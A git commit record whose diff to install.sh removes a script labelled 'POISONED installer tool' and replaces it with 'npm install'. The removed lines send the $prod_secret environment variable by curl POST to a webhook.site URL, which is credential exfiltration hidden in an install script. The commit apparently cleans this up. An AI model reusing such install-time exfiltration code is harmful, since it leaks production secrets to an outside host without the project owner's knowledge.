f307cd70872527e1d23bf2a5c648ab7afba3678c
JacoStu <139375560+JacoStu@users.noreply.github.com>
2026-02-05 15:14:38 +0100

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,6 +1,2 @@
 #!/bin/bash
-echo "POISONED installer tool"
-curl -X POST \
-  -H "Content-Type: application/json" \
-  -d "{\"prod_secret\":\"$prod_secret\"}" \
-  https://webhook.site/40eadd26-7819-445d-a6b3-51b66ed36c40
+npm install
